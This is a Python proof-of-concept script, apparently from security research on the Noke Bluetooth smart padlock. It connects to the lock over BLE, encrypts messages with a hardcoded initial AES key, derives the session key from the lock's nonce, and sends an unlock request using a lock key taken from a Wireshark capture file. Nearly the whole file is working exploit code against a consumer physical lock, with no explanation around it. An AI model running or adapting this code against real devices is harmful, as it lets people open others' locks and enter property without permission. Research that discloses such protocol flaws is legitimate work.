#!/usr/bin/python3

# Requirements: https://github.com/peplin/pygatt
# sudo pip install pygatt
# sudo pip install "pygatt[GATTTOOL]"

import pygatt, logging, sys
from Crypto.Cipher import AES
from binascii import hexlify, unhexlify

logging.basicConfig()
logging.getLogger('pygatt').setLevel(logging.NOTSET)

# Noke - Unlock - Demo
# MAC address: 11:22:33:44:55:66

UUID_NOTIFY_CHARACTERISTIC_UUID = '1bc50003-0200-d29e-e511-446c609db825'
UUID_WRITE_CHARACTERISTIC_UUID = '1bc50002-0200-d29e-e511-446c609db825'

INITIAL_AES_KEY = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
cipher = AES.new(INITIAL_AES_KEY, AES.MODE_ECB)

types = {
    1: 'SESSION_START',
    2: 'SESSION_START_CONFIGURATION',
    6: 'UNLOCK_REQUEST',
    7: 'UNLOCK_RESPONSE'
}

device = None
DEVICE_ADDRESS = '11:22:33:44:55:66'

INPUT_FILE_PATH = 'Tmp/03_Noke_Wireshark_capture_lock_key.txt'
lockKey = None # will be retrieved from the file below

def printMessageDescription(message, ciphertext, sent):
    if sent == True:
        print('Message sent:')
        print('\tLength: ' + str(message[1]) + '\n\tType: ' + types[message[2]] + ' (' + str(message[2]) + ')\n\tData: ' + hexlify(message[3: message[1] - 1]).decode())
        print('\tDecrypted message: ' + hexlify(message).decode())
        print('\tEncrypted message: ' + hexlify(ciphertext).decode())
    else:
        print('\tEncrypted message: ' + hexlify(ciphertext).decode())
        print('\tDecrypted message: ' + hexlify(message).decode())
        print('\tLength: ' + str(message[1]) + '\n\tType: ' + types[message[2]] + ' (' + str(message[2]) + ')\n\tData: ' + hexlify(message[3: message[1] - 1]).decode())

def sendNewSessionKeyRequest():
    message = b'\x7e\x08\x01\x00\x00\x00\x00\x87\x00\x00\x00\x00\x00\x00\x00\x00'
    ciphertext = cipher.encrypt(message)
    device.char_write(UUID_WRITE_CHARACTERISTIC_UUID, ciphertext)
    printMessageDescription(message, ciphertext, True)

def sendUnlockRequest():
    #lockkey = 'ea8982ba1af6'#.encode()
    #lockkey = unhexlify(key)
    message = b'\x7e\x0a\x06' + unhexlify(lockKey.encode()) + b'\x4d\x00\x00\x00\x00\x00\x00'
    ciphertext = cipher.encrypt(message)
    device.char_write(UUID_WRITE_CHARACTERISTIC_UUID, ciphertext)
    printMessageDescription(message, ciphertext, True)

def onNotifyCallback(handle, value):
    print('Message received:')
    if len(value) == 17:
        # cut the last byte (0x00)
        ciphertext =  bytes(value[0:16])

        # decrypt the ciphertext with the actual AES key
        message = cipher.decrypt(ciphertext)

        if message[0] == 0x7e:
            printMessageDescription(message, ciphertext, False)

            if message[2] == 2:
                # generate new AES key
                nonce1 = b'\x00\x00\x00\x00'
                nonce2 = message[3: message[1] -1]
                xornonce = bytes([a ^ b for a, b in zip(nonce1, nonce2)])
                key = bytes(INITIAL_AES_KEY[0:5]) + bytes([(a + b) % 256 for a, b in zip(INITIAL_AES_KEY[5:9], xornonce)]) + bytes(INITIAL_AES_KEY[9:16])
                print('New AES key defined: ' + hexlify(key).decode())
                global cipher
                cipher = AES.new(key, AES.MODE_ECB)

                sendUnlockRequest()
            elif message[2] == 7:
                print('Noke unlocked')
            else:
                print('\tERROR: Not a valid message type')
        else:
            print('\tERROR: Not a valid formatted message\n\tMessage: ' + hexlify(value).decode())
    else:
        print('\tERROR: Not a long enough message\n\tMessage: ' + hexlify(value).decode())


def main():
    # get the lock key
    with open(INPUT_FILE_PATH) as inputFile:
        global lockKey
        lockKey = inputFile.read()
    inputFile.close()

    try:
        adapter = pygatt.GATTToolBackend()
        adapter.start()

        # connect to the device
        global device
        device = adapter.connect(DEVICE_ADDRESS, address_type=pygatt.BLEAddressType.random)
        print('Connected to the device')
        print('Press any key to stop this program...\n')

        # subscribe to the notifications' channel
        device.subscribe(UUID_NOTIFY_CHARACTERISTIC_UUID, callback=onNotifyCallback)

        sendNewSessionKeyRequest()

        # wait until a keyboard key is pressed
        input()
    finally:
        adapter.stop()

if __name__ == "__main__":
    main()
